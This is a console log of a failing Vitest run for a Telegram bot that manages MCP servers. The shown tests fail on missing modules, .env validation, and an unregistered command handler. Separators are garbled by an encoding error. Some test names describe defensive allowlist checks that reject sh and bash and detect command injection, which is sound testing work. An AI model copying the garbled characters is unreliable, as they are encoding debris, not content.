    270|   it('should support ON CONFLICT for mcp_servers upsert', async () => {
    271|     const { DatabaseManager } = await import('../src/state/database');
    272|     const dbManager = await DatabaseManager.create(':memory:');
       |                                             ^
    273|     
    274|     const now = new Date().toISOString();

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[47/182]Ã”Ã„Â»

 FAIL  tests/input-size-limits.test.ts > Message Size Validation > should allow messages under the size limit
 FAIL  tests/input-size-limits.test.ts > Message Size Validation > should truncate messages over the size limit
 FAIL  tests/input-size-limits.test.ts > Message Size Validation > should handle multi-byte UTF-8 characters correctly
 FAIL  tests/input-size-limits.test.ts > Message Size Validation > should send warning message to user when truncating
 FAIL  tests/input-size-limits.test.ts > Message Size Validation > should log truncation events
Error: Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.
 Ã”Ã˜Â» loadConfig src/config.ts:197:11
    195|       .map((issue) => `  - ${issue.path.join('.')}: ${issue.message}`)
    196|       .join('\n');
    197|     throw new Error(
       |           ^
    198|       `Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:\n${errors}\n\n`Ã”Ã‡Âª
    199|         'Copia .env.example a .env y rellena los valores obligatorios.'
 Ã”Ã˜Â» src/config.ts:205:23
 Ã”Ã˜Â» src/bot/message-handler.ts:1:1

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[48/182]Ã”Ã„Â»

 FAIL  tests/input-size-limits.test.ts > Buffer Size Validation (Streaming) > should allow streaming buffer under size limit
 FAIL  tests/input-size-limits.test.ts > Buffer Size Validation (Streaming) > should warn when streaming buffer exceeds size limit
 FAIL  tests/input-size-limits.test.ts > Buffer Size Validation (Streaming) > should include buffer size in warning message
 FAIL  tests/input-size-limits.test.ts > Buffer Size Validation (Streaming) > should log buffer size warnings
 FAIL  tests/input-size-limits.test.ts > Buffer Size Validation (Streaming) > should only warn once per buffer overflow
Error: Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.
 Ã”Ã˜Â» loadConfig src/config.ts:197:11
    195|       .map((issue) => `  - ${issue.path.join('.')}: ${issue.message}`)
    196|       .join('\n');
    197|     throw new Error(
       |           ^
    198|       `Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:\n${errors}\n\n`Ã”Ã‡Âª
    199|         'Copia .env.example a .env y rellena los valores obligatorios.'
 Ã”Ã˜Â» src/config.ts:205:23
 Ã”Ã˜Â» src/bot/message-handler.ts:1:1

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[49/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > generateCallbackData > should include timestamp in callback_data
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:16:40
     14|   describe('generateCallbackData', () => {
     15|     it('should include timestamp in callback_data', () => {
     16|       const { generateCallbackData } = require('../src/bot/keyboard-utÃ”Ã‡Âª
       |                                        ^
     17|       
     18|       const callbackData = generateCallbackData('model', 'claude-sonneÃ”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[50/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > generateCallbackData > should handle multiple colons in data
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:30:40
     28| 
     29|     it('should handle multiple colons in data', () => {
     30|       const { generateCallbackData } = require('../src/bot/keyboard-utÃ”Ã‡Âª
       |                                        ^
     31|       
     32|       const callbackData = generateCallbackData('mcp_toggle', 'server:Ã”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[51/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > generateCallbackData > should generate different timestamps for sequential calls
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:44:40
     42| 
     43|     it('should generate different timestamps for sequential calls', asÃ”Ã‡Âª
     44|       const { generateCallbackData } = require('../src/bot/keyboard-utÃ”Ã‡Âª
       |                                        ^
     45|       
     46|       const callback1 = generateCallbackData('model', 'gpt-5');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[52/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should accept fresh callback data
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:59:57
     57|   describe('isCallbackValid', () => {
     58|     it('should accept fresh callback data', () => {
     59|       const { generateCallbackData, isCallbackValid } = require('../srÃ”Ã‡Âª
       |                                                         ^
     60|       
     61|       const callbackData = generateCallbackData('model', 'claude-sonneÃ”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[53/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should reject expired callback data
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:67:35
     65| 
     66|     it('should reject expired callback data', () => {
     67|       const { isCallbackValid } = require('../src/bot/keyboard-utils');
       |                                   ^
     68|       
     69|       // Create expired callback (6 minutes ago, default TTL is 5 minuÃ”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[54/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should accept callback within TTL
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:77:35
     75| 
     76|     it('should accept callback within TTL', () => {
     77|       const { isCallbackValid } = require('../src/bot/keyboard-utils');
       |                                   ^
     78|       
     79|       // Create callback from 4 minutes ago (within 5 minute TTL)

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[55/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should handle callback data with multiple colons
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:87:35
     85| 
     86|     it('should handle callback data with multiple colons', () => {
     87|       const { isCallbackValid } = require('../src/bot/keyboard-utils');
       |                                   ^
     88|       
     89|       const recentTimestamp = Date.now() - (2 * 60 * 1000);

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[56/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should handle invalid timestamp gracefully
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:96:35
     94| 
     95|     it('should handle invalid timestamp gracefully', () => {
     96|       const { isCallbackValid } = require('../src/bot/keyboard-utils');
       |                                   ^
     97|       
     98|       const invalidCallbackData = `model:gpt-5:invalid`;

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[57/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > isCallbackValid > should handle callback data without timestamp
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:104:35
    102| 
    103|     it('should handle callback data without timestamp', () => {
    104|       const { isCallbackValid } = require('../src/bot/keyboard-utils');
       |                                   ^
    105|       
    106|       const oldFormatCallbackData = `model:gpt-5`;

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[58/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > extractCallbackParts > should extract action and data from callback with timestamp
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:114:62
    112|   describe('extractCallbackParts', () => {
    113|     it('should extract action and data from callback with timestamp', Ã”Ã‡Âª
    114|       const { extractCallbackParts, generateCallbackData } = require('Ã”Ã‡Âª
       |                                                              ^
    115|       
    116|       const callbackData = generateCallbackData('model', 'claude-opus-Ã”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[59/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > extractCallbackParts > should handle data with colons
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:124:62
    122| 
    123|     it('should handle data with colons', () => {
    124|       const { extractCallbackParts, generateCallbackData } = require('Ã”Ã‡Âª
       |                                                              ^
    125|       
    126|       const callbackData = generateCallbackData('mcp_toggle', 'server:Ã”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[60/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > Config - KEYBOARD_TTL_MS > should use default TTL of 5 minutes
Error: Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:137:36
    135|     it('should use default TTL of 5 minutes', () => {
    136|       // Clear module cache to get fresh config
    137|       delete require.cache[require.resolve('../src/config')];
       |                                    ^
    138|       
    139|       const { KEYBOARD_TTL_MS } = require('../src/bot/keyboard-utils');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[61/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Keyboard Expiration > Config - KEYBOARD_TTL_MS > should respect custom TTL from environment
Error: Cannot find module '../src/bot/keyboard-utils'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:150:36
    148|       
    149|       // Clear module cache to reload with new env
    150|       delete require.cache[require.resolve('../src/bot/keyboard-utils'Ã”Ã‡Âª
       |                                    ^
    151|       
    152|       const { KEYBOARD_TTL_MS } = require('../src/bot/keyboard-utils');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[62/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Callback Handlers - Expiration Validation > should validate timestamp before processing model callback
Error: Cannot find module '../src/bot/callbacks'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:191:35
    189|     
    190|     // Import and register callbacks
    191|     const { registerCallbacks } = require('../src/bot/callbacks');
       |                                   ^
    192|     registerCallbacks(mockBot, mockSessionManager, mockUserState, mockÃ”Ã‡Âª
    193|     

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[63/182]Ã”Ã„Â»

 FAIL  tests/keyboard-expiration.test.ts > Callback Handlers - Expiration Validation > should process valid callback normally
Error: Cannot find module '../src/bot/callbacks'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\keyboard-expiration.test.ts
 Ã”Ã˜Â» tests/keyboard-expiration.test.ts:251:35
    249|     
    250|     // Import and register callbacks
    251|     const { registerCallbacks } = require('../src/bot/callbacks');
       |                                   ^
    252|     registerCallbacks(mockBot, mockSessionManager, mockUserState, mockÃ”Ã‡Âª
    253|     

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[64/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should REJECT disallowed executable via /mcp add stdio
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:103:15
    101|       const handler = (bot as any).commandHandlers?.get('mcp');
    102|       if (!handler) {
    103|         throw new Error('mcp command handler not registered');
       |               ^
    104|       }
    105| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[65/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should ACCEPT allowed executable via /mcp add stdio
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:132:15
    130|       const handler = (bot as any).commandHandlers?.get('mcp');
    131|       if (!handler) {
    132|         throw new Error('mcp command handler not registered');
       |               ^
    133|       }
    134| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[66/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should REJECT sh executable (shell injection risk)
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:159:15
    157|       const handler = (bot as any).commandHandlers?.get('mcp');
    158|       if (!handler) {
    159|         throw new Error('mcp command handler not registered');
       |               ^
    160|       }
    161| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[67/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should REJECT bash executable (shell injection risk)
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:185:15
    183|       const handler = (bot as any).commandHandlers?.get('mcp');
    184|       if (!handler) {
    185|         throw new Error('mcp command handler not registered');
       |               ^
    186|       }
    187| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[68/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should ACCEPT python from default allowlist
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:210:15
    208|       const handler = (bot as any).commandHandlers?.get('mcp');
    209|       if (!handler) {
    210|         throw new Error('mcp command handler not registered');
       |               ^
    211|       }
    212| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[69/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should ACCEPT npx from default allowlist
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:235:15
    233|       const handler = (bot as any).commandHandlers?.get('mcp');
    234|       if (!handler) {
    235|         throw new Error('mcp command handler not registered');
       |               ^
    236|       }
    237| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[70/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should NOT validate HTTP servers (no command to check)
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:260:15
    258|       const handler = (bot as any).commandHandlers?.get('mcp');
    259|       if (!handler) {
    260|         throw new Error('mcp command handler not registered');
       |               ^
    261|       }
    262| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[71/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Security: Executable Allowlist Validation > should show user-friendly error message with allowed executables list
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:286:15
    284|       const handler = (bot as any).commandHandlers?.get('mcp');
    285|       if (!handler) {
    286|         throw new Error('mcp command handler not registered');
       |               ^
    287|       }
    288| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[72/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Bypass Prevention > should prevent bypassing allowlist with full path to disallowed executable
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:311:15
    309|       const handler = (bot as any).commandHandlers?.get('mcp');
    310|       if (!handler) {
    311|         throw new Error('mcp command handler not registered');
       |               ^
    312|       }
    313| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[73/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Bypass Prevention > should detect command injection attempts in executable name
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:335:15
    333|       const handler = (bot as any).commandHandlers?.get('mcp');
    334|       if (!handler) {
    335|         throw new Error('mcp command handler not registered');
       |               ^
    336|       }
    337| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[74/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Backward Compatibility > should maintain existing /mcp add http functionality
Error: mcp command handler not registered
 Ã”Ã˜Â» tests/mcp-add-command-allowlist.test.ts:359:15
    357|       const handler = (bot as any).commandHandlers?.get('mcp');
    358|       if (!handler) {
    359|         throw new Error('mcp command handler not registered');
       |               ^
    360|       }
    361| 

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[75/182]Ã”Ã„Â»

 FAIL  tests/mcp-add-command-allowlist.test.ts > Task 1.2: /mcp add Command Allowlist Validation > Backward Compatibility > should maintain existing error messages for invalid type
Error: mcp command handler not registered
